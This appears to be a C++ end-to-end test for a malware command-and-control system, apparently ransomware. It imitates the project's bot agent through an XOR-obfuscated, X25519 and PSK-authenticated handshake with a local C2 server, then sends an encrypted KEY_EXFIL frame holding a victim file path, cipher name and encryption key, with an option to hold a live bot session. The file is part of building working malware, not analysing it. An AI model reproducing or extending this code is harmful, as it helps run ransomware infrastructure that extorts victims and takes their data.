// ============================================================================
// test_e2e_handshake.cpp — End-to-end ECDH handshake test against ./RSW
//
// Behaves exactly like the real bot (c2_agent.cpp) for the handshake path:
//   BOT_CONNECT → SESSION_PUB → CLIENT_PUB+confirm → AUTH_OK verify
// then proves the derived session key works by sending an AEAD-encrypted
// KEY_EXFIL frame (server must log the capture).
//
// Build:  clang++ -std=c++17 -I MWare/ tests/test_e2e_handshake.cpp \
//             MWare/keyexchange.cpp MWare/crypto.cpp -o /tmp/e2e_hs
// Run:    ./RSW &  then  /tmp/e2e_hs [psk]
// Exit:   0 = handshake + key exfil round-trip OK
// ============================================================================
#include "keyexchange.h"
#include "crypto.h"

#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using std::string;
using std::vector;

static string wrapT(const string& d) {          // 4B BE len + xor checksum
    string w;
    size_t n = d.length();
    w += (char)((n >> 24) & 0xFF); w += (char)((n >> 16) & 0xFF);
    w += (char)((n >> 8) & 0xFF);  w += (char)(n & 0xFF);
    unsigned char ck = 0;
    for (char c : d) ck ^= (unsigned char)c;
    w += (char)ck;
    w += d;
    return w;
}

static string unwrapT(const string& d) {
    if (d.length() < 5) return "";
    size_t n = ((unsigned char)d[0] << 24) | ((unsigned char)d[1] << 16) |
               ((unsigned char)d[2] << 8) | (unsigned char)d[3];
    if (n > 0x0FFFFFFF || n > d.length() - 5) return "";
    string ex = d.substr(5, n);
    unsigned char ck = (unsigned char)d[4], calc = 0;
    for (char c : ex) calc ^= (unsigned char)c;
    return (calc == ck) ? ex : "";
}

static bool sendAll(int s, const string& d) {
    size_t sent = 0;
    while (sent < d.length()) {
        ssize_t n = ::send(s, d.c_str() + sent, d.length() - sent, 0);
        if (n <= 0) return false;
        sent += (size_t)n;
    }
    return true;
}

// Read exactly one wrapped frame (accumulate over recvs, 10s cap via SO_RCVTIMEO)
static string recvFrame(int s) {
    string acc;
    while (true) {
        char b[2048];
        ssize_t m = ::recv(s, b, sizeof(b), 0);
        if (m <= 0) return "";
        acc.append(b, m);
        if (acc.size() >= 5) {
            size_t n = ((unsigned char)acc[0] << 24) | ((unsigned char)acc[1] << 16) |
                       ((unsigned char)acc[2] << 8) | (unsigned char)acc[3];
            if (n > 0x0FFFFFFF) return "";
            if (acc.size() >= 5 + n) return acc.substr(0, 5 + n);
        }
    }
}

int main(int argc, char** argv) {
    string psk = (argc > 1) ? argv[1] : loadPsk();
    const char* bot_id = "E2E_TEST_BOT";

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        perror("connect"); return 1;
    }
    timeval tv{10, 0};
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // ---- Step 1: BOT_CONNECT (XOR 0x55, raw) ----
    string ident = string("BOT_CONNECT:") + bot_id + "\n";
    for (auto& c : ident) c = (char)((unsigned char)c ^ 0x55);
    if (!sendAll(s, ident)) { puts("FAIL: send BOT_CONNECT"); return 1; }

    // ---- Step 2: SESSION_PUB (XOR 0x5A, wrapped) ----
    string f2 = recvFrame(s);
    string m2 = unwrapT(f2);
    for (auto& c : m2) c = (char)((unsigned char)c ^ 0x5A);
    if (m2.size() < 12 + 32 || m2.substr(0, 12) != "SESSION_PUB:") {
        printf("FAIL: expected SESSION_PUB, got %.30s\n", m2.c_str());
        return 1;
    }
    uint8_t srv_pub[32];
    memcpy(srv_pub, m2.data() + 12, 32);
    puts("ok   step2 SESSION_PUB received");

    // ---- Step 3: derive key, send CLIENT_PUB + confirm MAC (XOR 0x55) ----
    uint8_t priv[32], pub[32], shared[32], session_key[32];
    if (x25519Keypair(priv, pub) != 0) { puts("FAIL: keypair"); return 1; }
    x25519(shared, priv, srv_pub);
    deriveSessionKey(shared, srv_pub, pub, bot_id, session_key);
    memset(priv, 0, 32); memset(shared, 0, 32);

    uint8_t confirm[32];
    computeConfirmMac(psk, srv_pub, pub, confirm);
    string m3 = string("CLIENT_PUB:") + string((char*)pub, 32) +
                string((char*)confirm, 32);
    for (auto& c : m3) c = (char)((unsigned char)c ^ 0x55);
    if (!sendAll(s, wrapT(m3))) { puts("FAIL: send CLIENT_PUB"); return 1; }
    puts("ok   step3 CLIENT_PUB sent");

    // ---- Step 4: AUTH_OK + verify server PSK proof (XOR 0x5A) ----
    string f4 = recvFrame(s);
    string m4 = unwrapT(f4);
    for (auto& c : m4) c = (char)((unsigned char)c ^ 0x5A);
    if (m4.size() < 8 + 32 || m4.substr(0, 8) != "AUTH_OK:") {
        printf("FAIL: expected AUTH_OK, got %.30s\n", m4.c_str());
        return 1;
    }
    uint8_t auth_mac[32], expect[32];
    memcpy(auth_mac, m4.data() + 8, 32);
    computeAuthMac(psk, srv_pub, pub, bot_id, expect);
    if (!constantTimeEqual(expect, auth_mac, 32)) {
        puts("FAIL: AUTH_OK MAC mismatch (mutual auth)");
        return 1;
    }
    puts("ok   step4 AUTH_OK verified (mutual auth)");

    // ---- Round-trip: AEAD-encrypted KEY_EXFIL frame ----
    string exfil = string("KEY_EXFIL:") + bot_id +
                   "|C:\\Users\\test\\secret.docx|ChaCha20|"
                   "0123456789abcdef0123456789abcdef";
    string wrapped = wrapT(exfil);
    uint8_t nonce[12];
    for (int i = 0; i < 12; i++) nonce[i] = (uint8_t)(i * 7 + 1);
    vector<uint8_t> pt(wrapped.begin(), wrapped.end());
    vector<uint8_t> aead = chacha20Poly1305Encrypt(pt, session_key, nonce);
    string inner;
    inner.append((char*)nonce, 12);
    inner.append((char*)aead.data(), aead.size());
    // outer framing: 4B BE length of AEAD blob (matches server's frame parser)
    string frame;
    size_t n = inner.length();
    frame += (char)((n >> 24) & 0xFF); frame += (char)((n >> 16) & 0xFF);
    frame += (char)((n >> 8) & 0xFF);  frame += (char)(n & 0xFF);
    frame += inner;
    if (!sendAll(s, frame)) { puts("FAIL: send KEY_EXFIL"); return 1; }
    puts("ok   step5 AEAD KEY_EXFIL sent (server must log capture)");

    sleep(1);   // let the server process + log before we vanish

    // Optional: stay connected so a caller can run UI commands against a
    // LIVE authenticated bot (argv[2] == "--hold"). Recv loop until server
    // closes us — mirrors the real bot's steady-state receive.
    if (argc > 2 && string(argv[2]) == "--hold") {
        puts("holding connection...");
        while (true) {
            char b[4096];
            ssize_t r = ::recv(s, b, sizeof(b), 0);
            if (r <= 0) break;   // server closed / shutdown woke us
        }
    }

    close(s);
    memset(session_key, 0, 32);
    puts("ALL OK");
    return 0;
}
